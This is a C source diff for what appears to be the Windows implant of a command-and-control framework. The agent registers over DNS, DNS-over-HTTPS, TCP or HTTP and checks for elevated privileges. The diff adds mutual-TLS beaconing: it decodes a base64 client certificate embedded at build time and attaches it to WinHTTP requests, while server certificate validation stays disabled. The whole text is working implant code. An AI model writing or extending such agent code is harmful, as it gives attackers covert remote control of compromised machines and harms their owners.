@@ -4,6 +4,7 @@
 #include "b64.h"
 #include <windows.h>
 #include <winhttp.h>
+#include <wincrypt.h>
 #include <tlhelp32.h>
 #include <stdlib.h>
 #include <string.h>
@@ -18,6 +19,31 @@
 #include "transport_tcp.h"
 
 AgentState g_agent = {0};
+
+// ── mTLS client certificate ───────────────────────────────────────────────────
+
+#ifndef AGENT_PFX
+#define AGENT_PFX ""
+#endif
+
+static PCCERT_CONTEXT g_mtls_cert = NULL;
+static LONG g_mtls_cert_init = 0;
+
+static void load_mtls_cert(void) {
+    const char *pfx_b64 = AGENT_PFX;
+    if (!pfx_b64[0]) return;
+    size_t dec_len = 0;
+    uint8_t *pfx = b64_decode(pfx_b64, &dec_len);
+    if (!pfx) return;
+    CRYPT_DATA_BLOB blob = {(DWORD)dec_len, pfx};
+    HCERTSTORE hStore = PFXImportCertStore(&blob, L"", CRYPT_EXPORTABLE);
+    free(pfx);
+    if (!hStore) return;
+    PCCERT_CONTEXT ctx = CertFindCertificateInStore(hStore,
+        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_ANY, NULL, NULL);
+    CertCloseStore(hStore, 0);
+    g_mtls_cert = ctx;
+}
 
 static CRITICAL_SECTION g_transport_lock;
 static LONG g_transport_lock_init = 0;
@@ -108,6 +134,10 @@ static int http_do(const char *method, const char *path,
     if (p.is_https) {
         DWORD sec = SEC_IGNORE_FLAGS;
         WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
+        if (strcmp(AGENT_TRANSPORT, "mtls") == 0 && g_mtls_cert) {
+            WinHttpSetOption(hReq, WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
+                (LPVOID)g_mtls_cert, sizeof(*g_mtls_cert));
+        }
     }
 
     if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
@@ -296,6 +326,12 @@ static int is_elevated(void) {
 }
 
 int agent_register(void) {
+    // Load mTLS client cert once on first registration attempt.
+    if (strcmp(AGENT_TRANSPORT, "mtls") == 0) {
+        if (InterlockedCompareExchange(&g_mtls_cert_init, 1, 0) == 0)
+            load_mtls_cert();
+    }
+
     // Transport dispatch
     if (strcmp(AGENT_TRANSPORT, "dns") == 0) return transport_dns_register();
     if (strcmp(AGENT_TRANSPORT, "doh") == 0) return transport_doh_register();
